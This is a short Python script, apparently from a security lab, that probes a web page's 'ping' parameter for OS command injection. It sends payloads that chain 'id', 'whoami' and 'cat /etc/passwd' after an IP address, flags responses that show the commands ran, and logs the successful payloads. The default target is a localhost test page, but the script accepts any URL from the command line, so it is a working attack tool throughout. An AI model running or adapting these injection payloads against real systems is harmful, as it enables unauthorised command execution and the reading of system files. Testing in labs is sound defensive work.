import requests
import sys
import time

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/cmd_inject.php"
payloads = [
    "127.0.0.1; id",
    "127.0.0.1 | whoami",
    "127.0.0.1 && cat /etc/passwd"
]
for p in payloads:
    r = requests.get(target, params={'ping': p})
    if "uid=" in r.text or "root" in r.text:
        print(f"\033[92m[CMD] {p} -> {r.text[:150]}\033[0m")
        with open("../logs/cmd_inject.txt", "a") as f:
            f.write(f"{p}: {r.text}\n")
    else:
        print(f"\033[91m[NO] {p}\033[0m")
    time.sleep(1)